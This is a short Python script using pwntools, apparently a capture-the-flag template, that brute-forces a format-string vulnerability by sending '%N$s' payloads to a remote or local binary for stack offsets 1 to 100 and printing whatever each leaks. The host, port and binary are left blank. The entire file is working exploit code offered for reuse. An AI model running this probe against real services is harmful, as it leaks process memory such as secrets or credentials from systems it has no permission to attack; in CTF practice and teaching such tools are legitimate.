# to brute force a stack using strng format attack

from pwn import *
context.log_level = "critical"

""""""""""""""""""""""""""""""""""""""
REMOTE_OR_LOCAL = 0 # 0 for remote, 1 for local
HOST = "www."
PORT = 0
BINARY = "./"

DEPTH = 100 # how far down the stack to brute force

def getMessage(r):
    # modify which part of the output to check for flag
    # e.g. recvline_contains, recvline_startswith, revcline_endswith
    return r.recvline_startswith("Enter").split()[11]
""""""""""""""""""""""""""""""""""""""
for i in range(1,DEPTH):
    try:
        if REMOTE_OR_LOCAL:
            r = process(BINARY)
        else:
            r = remote(HOST, PORT)

        PAYLOAD = "%"+str(i)+"$s"
        r.sendline(PAYLOAD)
        message = getMessage(r)
        print(i, message)

        # r.interactive()  
    except EOFError:
        print(i, "failed")